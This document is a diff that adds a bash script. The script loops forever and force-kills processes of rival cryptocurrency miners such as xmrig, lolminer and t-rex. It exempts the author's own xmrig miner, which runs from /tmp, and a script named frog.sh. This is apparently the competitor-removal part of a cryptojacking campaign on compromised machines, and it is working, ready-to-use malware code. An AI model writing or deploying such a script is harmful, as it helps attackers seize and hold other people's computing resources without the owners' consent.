@@ -1,0 +1,32 @@
+#!/bin/bash
+
+# Miner process names to target (other miners)
+KILL_LIST=("xmrig" "xmr_linux_amd64" "lolminer" "nbminer" "t-rex" "minerd" "cpuminer" "ethminer" "SRBMiner-MULTI" "check.sh" "xmr-go.sh")
+
+# Your miner's unique process names or paths (replace with exact ones)
+OWN_MINER_PATHS=(
+    "./xmrig -c settings.json"
+    "/tmp/xmrig/xmrig-6.22.2/xmrig -c /tmp/xmrig/xmrig-6.22.2/settings.json"
+)
+
+# Real running commands or scripts you want to whitelist
+WHITELIST=("settings.json" "frog.sh" "nginx" "${OWN_MINER_PATHS[@]}")
+
+while true; do
+    for proc in "${KILL_LIST[@]}"; do
+        for pid in $(pgrep -f "$proc"); do
+            cmd=$(ps -p "$pid" -o cmd=)
+            skip=0
+            for white in "${WHITELIST[@]}"; do
+                if [[ "$cmd" == *"$white"* ]]; then
+                    skip=1
+                    break
+                fi
+            done
+            if [[ $skip -eq 0 ]]; then
+                kill -9 "$pid"
+            fi
+        done
+    done
+    sleep 10
+done
